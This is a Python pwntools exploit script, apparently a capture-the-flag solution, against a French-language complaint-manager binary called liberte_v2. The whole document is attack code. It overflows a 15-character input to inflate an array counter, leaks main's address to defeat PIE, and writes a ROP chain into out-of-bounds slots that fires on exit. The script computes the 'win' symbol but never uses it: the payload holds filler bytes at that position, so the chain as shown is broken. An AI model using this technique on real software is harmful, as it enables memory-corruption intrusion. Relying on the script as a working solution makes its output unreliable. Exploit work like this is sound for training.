#!/usr/bin/env python3

# pwninit

from pwn import *
from struct import pack
# b * afficher_toutes_les_plaintes
def attach_gdb(r):
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/opt/pwndbg/gdbinit.py
#b * modifier_plainte_par_index
c
        """)

def connect(bin_name):
    print("connect")
    if args.REMOTE:
        r = remote("127.0.0.1",10204)
        return r
    return process(bin_name)

def add_complaint(r):
    print("Adding complaint")
    r.sendlineafter("Votre choix: ".encode(), "1".encode())
    r.sendlineafter("Entrez votre plainte (max 15 caractères): ".encode(), "A".encode())

def get_leak(r):
    print("Getting binary base address")
    r.sendlineafter("Entrez la nouvelle plainte (max 15 caractères): ".encode(), b"A"*16+pack("<I",200))
    r.sendlineafter("Votre choix: ".encode(), "3".encode())

    print(r.recvuntil(b"199. "))
    start_leak = r.recvline()
    start_leak = u64(start_leak.strip().ljust(8,b"\x00"))

    return start_leak

def exploit(e,r):
    print(">>> Exploit for liberte_v2")
    # Add 5 complaints to fill the array
    for _ in range(5):
        add_complaint(r)

    # Edit the 5th complaint to overwrite "nombre_plaintes" and leak the binary base address
    print("Editing complaint")
    r.sendlineafter("Votre choix: ".encode(), "2".encode())
    r.sendlineafter("): ".encode(), "4".encode())
    start_leak = get_leak(r)

    # Calculate the binary base address
    e.address = start_leak - e.symbols["main"]
    print(f"main @ {hex(start_leak)}")
    print(f"Binary @ {hex(e.address)}")

    # Exploit ROP
    print("It's ROP time!")
    # * ------------------ *
    #       Gadgets
    # * ------------------ *
    gdg_ret = 0x000000000000101a+e.address
    gdg_win = e.sym['win']

    # * ------------------ *
    #       Payload
    # * ------------------ *
    rop = b"A"*8
    rop += p64(gdg_ret) # Align stack
    rop += b"A"*8 # Win!

    # (LOCAL) : INDEX = 7
    INDEX = 7

    r.sendlineafter("Votre choix: ".encode(), "2".encode())
    r.sendlineafter("): ".encode(), str(INDEX).encode())

    # Send the payload
    print("Sending payload")
    r.sendlineafter("Entrez la nouvelle plainte (max 15 caractères): ".encode(), rop[:16])

    r.sendlineafter("Votre choix: ".encode(), "2".encode())
    r.sendlineafter("): ".encode(), str(INDEX+1).encode())

    # Send the payload
    print("Sending payload")
    r.sendlineafter("Entrez la nouvelle plainte (max 15 caractères): ".encode(), rop[16:])

    # Let's quit the program in order to trigger the rop!
    r.sendlineafter("Votre choix: ".encode(), "0".encode())


e = context.binary = ELF("liberte_v2_patched")
r = connect("liberte_v2_patched")

attach_gdb(r)
exploit(e,r)
r.interactive()
